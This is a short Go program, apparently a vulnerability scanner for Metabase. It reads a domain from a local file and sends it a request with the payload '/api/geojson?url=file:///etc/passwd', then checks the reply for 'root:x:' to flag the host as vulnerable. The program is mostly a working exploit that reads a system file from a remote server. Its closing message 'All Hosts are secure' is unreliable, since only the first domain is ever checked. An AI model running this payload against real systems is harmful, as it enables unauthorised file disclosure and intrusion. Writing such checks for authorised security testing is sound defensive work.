package main

// library to use net/http net/dialer
import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"regexp"
	"time"
)

func main() {
	file, err := os.Open("/Users/piyushchhiroliya/pingsafe/testdomains.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	if scanner.Scan() {
		//	fmt.Println(scanner.Text())
		client := http.Client{
			Timeout: 15 * time.Second,
		}
		resp, err := client.Get("https://" + scanner.Text() + "/api/geojson?url=file:///etc/passwd")
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(body))

		rxp, err := regexp.Compile("root:x:*")

		if rxp.Match(body) {
			fmt.Println("Host is Vulnerable for for metabase")
		} else {
			fmt.Println("All Hosts are secure")
		}
	}
}
